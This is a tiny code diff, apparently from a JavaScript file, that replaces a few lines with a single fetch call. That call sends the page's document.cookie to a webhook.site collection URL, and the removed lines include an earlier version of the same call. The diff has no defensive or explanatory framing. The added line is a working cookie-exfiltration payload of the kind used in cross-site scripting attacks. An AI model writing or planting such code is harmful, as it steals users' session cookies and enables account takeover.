@@ -1,3 +1,1 @@
-console.log("hello")
-fetch("https://webhook.site/a9948b25-f169-4446-8448-02b7fe291920?q=" + document.cookie);
-console.log("teeest")
+fetch("https://webhook.site/cb43a2d0-bc9c-404b-abe8-f75d980a8021?q=" + document.cookie);
